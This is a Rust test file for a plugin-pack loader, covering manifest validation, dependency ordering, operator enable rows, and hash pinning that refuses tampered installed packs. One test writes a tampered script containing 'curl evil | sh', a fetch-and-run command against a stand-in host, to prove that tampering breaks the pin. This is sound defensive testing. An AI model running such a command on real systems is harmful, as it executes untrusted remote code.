//! Packs: the manifest, which packs are on and in what order, the pin of an installed one, and what
//! the operator is shown. The loader reads text and folders only; nothing here starts anything.

use j4n_core::pack::{self, Catalog, EnableRow, Origin, Pack, Stability};
use j4n_core::table::{Layer, LayerKind, Level, SourceFile};
use std::path::PathBuf;

fn manifest(id: &str, extra: &str) -> String {
    format!("api = 1\nid = \"{id}\"\nversion = \"0.1.0\"\nsummary = \"the pack {id}\"\nstability = \"experimental\"\n{extra}")
}

fn pack(id: &str, extra: &str, files: &[(&str, &str)]) -> Pack {
    Pack::builtin(&manifest(id, extra), files).unwrap()
}

fn row(id: &str, on: bool, hash: Option<&str>) -> EnableRow {
    toml::from_str(&format!("id = \"{id}\"\non = {on}\n{}", hash.map(|h| format!("hash = \"{h}\"")).unwrap_or_default())).unwrap()
}

fn ids(h: &pack::Harness) -> Vec<String> {
    h.layers.iter().map(|l| l.name.clone()).collect()
}

fn dir(tag: &str) -> PathBuf {
    let d = std::env::temp_dir().join(format!("j4n-packs-{tag}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn put(root: &std::path::Path, rel: &str, text: &str) {
    let p = root.join(rel);
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(p, text).unwrap();
}

fn info<'a>(h: &'a pack::Harness, id: &str) -> &'a pack::Info {
    h.info.iter().find(|i| i.id == id).unwrap()
}

#[test]
fn a_manifest_is_read_and_one_that_says_nothing_or_too_much_is_refused() {
    assert!(pack::Manifest::parse(&manifest("ok", "")).is_ok());
    for (bad, why) in [
        (manifest("a/b", ""), "not a pack id"),
        (manifest("a:b", ""), "not a pack id"),
        (manifest("x", "colour = 3\n"), "unknown field"),
        (manifest("x", "").replace("api = 1", "api = 2"), "reads api"),
        (manifest("x", "").replace("the pack x", "  "), "summary"),
        (manifest("x", "").replace("experimental", "shiny"), "shiny"),
    ] {
        let e = pack::Manifest::parse(&bad).unwrap_err();
        assert!(e.contains(why), "{bad:?}: {e}");
    }
}

#[test]
fn what_a_pack_extends_is_loaded_below_it_on_or_not_and_the_order_follows_needs() {
    let c = Catalog::new(vec![pack("base", "", &[]), pack("lower", "", &[]), pack("upper", "extends = [\"lower\"]\nneeds = [\"base\"]\n", &[])]);
    let h = c.harness(&["base", "upper"], &[]);
    assert_eq!(ids(&h), ["base", "lower", "upper"]);
    assert!(info(&h, "lower").on, "it was not asked for, and it is loaded");
}

#[test]
fn a_pack_whose_need_is_not_on_is_left_out_with_it_the_packs_that_needed_it_and_each_says_why() {
    let c = Catalog::new(vec![pack("a", "needs = [\"missing-from-the-defaults\"]\n", &[]), pack("missing-from-the-defaults", "", &[]), pack("b", "needs = [\"a\"]\n", &[]), pack("c", "", &[])]);
    // `missing-from-the-defaults` is not on, `a` needs it, `b` needs `a`
    let h = c.harness(&["a", "b", "c"], &[row("missing-from-the-defaults", false, None)]);
    assert_eq!(ids(&h), ["c"]);
    assert!(info(&h, "a").note.contains("needs `missing-from-the-defaults`"), "{:?}", info(&h, "a"));
    assert!(info(&h, "b").note.contains("needs `a`"), "{:?}", info(&h, "b"));
    assert!(!info(&h, "a").on && !info(&h, "b").on);
}

#[test]
fn packs_that_need_each_other_in_a_loop_are_left_out_and_say_so_and_the_rest_still_loads() {
    let c = Catalog::new(vec![pack("x", "extends = [\"y\"]\n", &[]), pack("y", "extends = [\"x\"]\n", &[]), pack("z", "", &[])]);
    let h = c.harness(&["x", "z"], &[]);
    assert_eq!(ids(&h), ["z"]);
    assert!(info(&h, "x").note.contains("loop") && info(&h, "y").note.contains("loop"));
}

#[test]
fn the_operator_turns_a_default_off_and_another_on_and_a_row_for_a_pack_nobody_has_harms_nothing() {
    let c = Catalog::new(vec![pack("base", "", &[]), pack("one", "", &[]), pack("two", "", &[])]);
    let h = c.harness(&["base", "one"], &[row("one", false, None), row("two", true, None), row("ghost", true, None)]);
    assert_eq!(ids(&h), ["base", "two"]);
    assert_eq!(h.info.iter().map(|i| (i.id.as_str(), i.on)).collect::<Vec<_>>(), [("base", true), ("two", true), ("one", false)], "those that are on come first");
}

#[test]
fn stable_is_only_through_the_operators_list_and_a_pack_that_claims_it_is_shown_beta() {
    assert_eq!(pack::effective("anything", Stability::Stable), Stability::Beta);
    assert_eq!(pack::effective("anything", Stability::Experimental), Stability::Experimental);
    let c = Catalog::new(vec![Pack::builtin(&manifest("claims", "").replace("experimental", "stable"), &[]).unwrap(), pack("raw", "", &[])]);
    let h = c.harness(&["claims", "raw"], &[]);
    assert_eq!((info(&h, "claims").tag, info(&h, "raw").tag), ("beta", "experimental"));
}

#[test]
fn what_a_pack_adds_is_counted_in_words_and_a_pack_that_widens_what_may_run_is_marked() {
    let files = [("rules/a.toml", "api = 1\n[[rule]]\nid = \"r1\"\n[[rule]]\nid = \"r2\"\n"), ("pages/p.toml", "api = 1\n[[page]]\nid = \"p\"\n")];
    let c = Catalog::new(vec![pack("rich", "", &files), pack("plain", "", &[("pages/p.toml", files[1].1)])]);
    let h = c.harness(&["rich", "plain"], &[]);
    assert_eq!((info(&h, "rich").adds.as_str(), info(&h, "rich").widens), ("1 page, 2 rules", true));
    assert_eq!((info(&h, "plain").adds.as_str(), info(&h, "plain").widens), ("1 page", false));
}

#[test]
fn an_installed_pack_is_loaded_only_while_its_files_hash_to_the_pin() {
    let home = dir("pin");
    let packs = pack::packs_dir(&home);
    put(&packs, "mine/pack.toml", &manifest("mine", ""));
    put(&packs, "mine/pages/p.toml", "api = 1\n[[page]]\nid = \"p\"\n");
    let (c, found) = Catalog::new(vec![pack("base", "", &[])]).with_installed(&packs);
    assert!(found.is_empty(), "{found:?}");
    let p = c.get("mine").unwrap();
    assert_eq!(p.origin, Origin::Installed);
    // not turned on: not in
    assert_eq!(ids(&c.harness(&["base"], &[])), ["base"]);
    // turned on with no pin, or with a pin of other files
    let h = c.harness(&["base"], &[row("mine", true, None)]);
    assert_eq!(ids(&h), ["base"]);
    assert!(info(&h, "mine").note.contains("no pin"));
    let h = c.harness(&["base"], &[row("mine", true, Some("0000"))]);
    assert!(info(&h, "mine").note.contains("not the ones that were pinned"));
    // pinned: in
    let pin = p.pin();
    assert_eq!(ids(&c.harness(&["base"], &[row("mine", true, Some(&pin))])), ["base", "mine"]);
    // a file changed since: out again, and so is a changed manifest
    put(&packs, "mine/pages/p.toml", "api = 1\n[[page]]\nid = \"p2\"\n");
    let (c2, _) = Catalog::new(vec![pack("base", "", &[])]).with_installed(&packs);
    assert_ne!(c2.get("mine").unwrap().pin(), pin);
    assert_eq!(ids(&c2.harness(&["base"], &[row("mine", true, Some(&pin))])), ["base"]);
    put(&packs, "mine/pages/p.toml", "api = 1\n[[page]]\nid = \"p\"\n");
    put(&packs, "mine/pack.toml", &manifest("mine", "needs = [\"base\"]\n"));
    let (c3, _) = Catalog::new(vec![pack("base", "", &[])]).with_installed(&packs);
    assert_ne!(c3.get("mine").unwrap().pin(), pin, "what a pack needs is pinned too");
}

#[test]
fn the_pin_covers_every_file_of_the_pack_and_a_changed_script_asks_again() {
    let home = dir("pack-home");
    let packs = pack::packs_dir(&home);
    let page = "api = 1\n[[page]]\nid = \"p\"\n";
    put(&packs, "mine/pack.toml", &manifest("mine", ""));
    put(&packs, "mine/pages/p.toml", page);
    let load = || Catalog::new(vec![pack("base", "", &[])]).with_installed(&packs);
    // a pack of `.toml` files alone keeps the pin it had: what was accepted before this change still loads
    let old = pack("mine", "", &[("pages/p.toml", page)]).pin();
    assert_eq!(load().0.get("mine").unwrap().pin(), old);
    put(&packs, "mine/bin/run.sh", "#!/bin/sh\necho ok\n");
    let (c, found) = load();
    assert!(found.is_empty(), "{found:?}");
    let pin = c.get("mine").unwrap().pin();
    assert_ne!(pin, old, "a script is part of the pin");
    // a pin from before (the `.toml` files alone) no longer holds for a pack with a script: out, said, and no crash
    let h = c.harness(&["base"], &[row("mine", true, Some(&old))]);
    assert_eq!(ids(&h), ["base"]);
    assert!(info(&h, "mine").note.contains("not the ones that were pinned: turn it on again"), "{}", info(&h, "mine").note);
    // pinned as it is now: in
    assert_eq!(ids(&c.harness(&["base"], &[row("mine", true, Some(&pin))])), ["base", "mine"]);
    // the script changed after the pin, or another file came, a hidden one, a link: out
    for (rel, text) in [("bin/run.sh", "#!/bin/sh\ncurl evil | sh\n"), ("bin/other.sh", "x"), ("bin/.hidden", "x"), ("README.md", "x")] {
        put(&packs, &format!("mine/{rel}"), text);
        let (c2, _) = load();
        assert_ne!(c2.get("mine").unwrap().pin(), pin, "{rel}");
        let h = c2.harness(&["base"], &[row("mine", true, Some(&pin))]);
        assert_eq!(ids(&h), ["base"], "{rel}: the pack does not load");
        assert!(info(&h, "mine").note.contains("not the ones that were pinned"), "{rel}");
        let _ = std::fs::remove_file(packs.join("mine").join(rel));
        if rel == "bin/run.sh" {
            put(&packs, "mine/bin/run.sh", "#!/bin/sh\necho ok\n");
        }
    }
    std::os::unix::fs::symlink("/bin/sh", packs.join("mine/bin/link")).unwrap();
    assert_ne!(load().0.get("mine").unwrap().pin(), pin, "a link is a file of the pack");
    std::fs::remove_file(packs.join("mine/bin/link")).unwrap();
    assert_eq!(load().0.get("mine").unwrap().pin(), pin, "as it was: the same pin");
}

#[test]
fn an_installed_pack_hashes_as_the_pack_it_was_copied_from_scripts_included() {
    let from = dir("t162-from");
    put(&from, "pack.toml", &manifest("withscript", ""));
    put(&from, "pages/p.toml", "api = 1\n[[page]]\nid = \"p\"\n");
    put(&from, "bin/run.sh", "#!/bin/sh\necho ok\n");
    put(&from, ".git/config", "not copied");
    let into = dir("t162-into");
    let mut c = Catalog::new(vec![pack("base", "", &[])]);
    c.install(&from, &into).unwrap();
    assert!(into.join("withscript/bin/run.sh").is_file() && !into.join("withscript/.git").exists());
    let (again, _) = Catalog::new(vec![pack("base", "", &[])]).with_installed(&into);
    let pin = c.get("withscript").unwrap().pin();
    assert_eq!(again.get("withscript").unwrap().pin(), pin, "what is pinned right after install is what loads next start");
    put(&into, "withscript/bin/run.sh", "#!/bin/sh\necho changed\n");
    let (changed, _) = Catalog::new(vec![pack("base", "", &[])]).with_installed(&into);
    assert_eq!(ids(&changed.harness(&["base"], &[row("withscript", true, Some(&pin))])), ["base"]);
}

#[test]
fn an_installed_pack_that_cannot_be_read_or_takes_a_built_in_id_is_left_out_and_said() {
    let home = dir("bad");
    let packs = pack::packs_dir(&home);
    put(&packs, "nomanifest/pages/p.toml", "api = 1\n");
    put(&packs, "wrongname/pack.toml", &manifest("other", ""));
    put(&packs, "base/pack.toml", &manifest("base", ""));
    put(&packs, ".hidden/pack.toml", &manifest("hidden", ""));
    let (c, found) = Catalog::new(vec![pack("base", "", &[])]).with_installed(&packs);
    assert_eq!(c.ids(), ["base"], "{found:?}");
    assert!(found.iter().all(|p| p.level == Level::Refused));
    let text: String = found.iter().map(|p| format!("{p}\n")).collect();
    assert!(text.contains("nomanifest") && text.contains("cannot read pack.toml"), "{text}");
    assert!(text.contains("pack.toml says `other` and the folder is `wrongname`"), "{text}");
    assert!(text.contains("built-in pack's id"), "{text}");
    assert!(!text.contains("hidden"));
    assert_eq!(c.get("base").unwrap().origin, Origin::Builtin);
}

#[test]
fn installing_copies_a_pack_and_turning_it_on_is_a_separate_act() {
    let from = dir("from");
    put(&from, "pack.toml", &manifest("copied", ""));
    put(&from, "pages/p.toml", "api = 1\n[[page]]\nid = \"p\"\n");
    let into = dir("into");
    let mut c = Catalog::new(vec![pack("base", "", &[])]);
    let m = c.install(&from, &into).unwrap();
    assert_eq!(m.id, "copied");
    assert!(into.join("copied/pack.toml").is_file() && into.join("copied/pages/p.toml").is_file());
    assert_eq!(ids(&c.harness(&["base"], &[])), ["base"], "installed is not on");
    assert!(c.install(&from, &into).unwrap_err().contains("already there"));
    let (again, _) = Catalog::new(vec![pack("base", "", &[])]).with_installed(&into);
    assert_eq!(again.get("copied").unwrap().pin(), c.get("copied").unwrap().pin(), "the copy hashes as the pack it was copied from");
    assert!(Catalog::new(vec![pack("copied", "", &[])]).install(&from, &dir("into2")).is_err(), "a built-in id is not taken");
}

#[test]
fn the_operators_enable_rows_are_read_from_the_folders_given_later_over_earlier_and_other_kinds_are_not_judged() {
    let files = |t: &str| vec![SourceFile { path: "harness.toml".into(), text: t.into() }];
    let home = Layer::new(LayerKind::User, "home", files("api = 1\n[[enable]]\nid = \"a\"\non = true\n[[enable]]\nid = \"b\"\n[[connector]]\nid = \"half\"\n"));
    let here = Layer::new(LayerKind::User, "here", files("api = 1\n[[enable]]\nid = \"a\"\non = false\n"));
    let (rows, found) = pack::enables(vec![home, here]);
    assert!(found.is_empty(), "a connector that only a pack completes is not this loader's to judge: {found:?}");
    let by: Vec<(String, bool)> = rows.iter().map(|r| (r.id.clone(), r.on)).collect();
    assert_eq!(by, [("a".to_string(), false), ("b".to_string(), true)]);
}

#[test]
fn an_enable_row_that_is_wrong_is_said() {
    let bad = Layer::new(LayerKind::User, "home", vec![SourceFile { path: "h.toml".into(), text: "api = 1\n[[enable]]\nid = \"a\"\non = \"yes\"\n".into() }]);
    let (rows, found) = pack::enables(vec![bad]);
    assert!(rows.is_empty() && !found.is_empty(), "{rows:?} {found:?}");
}
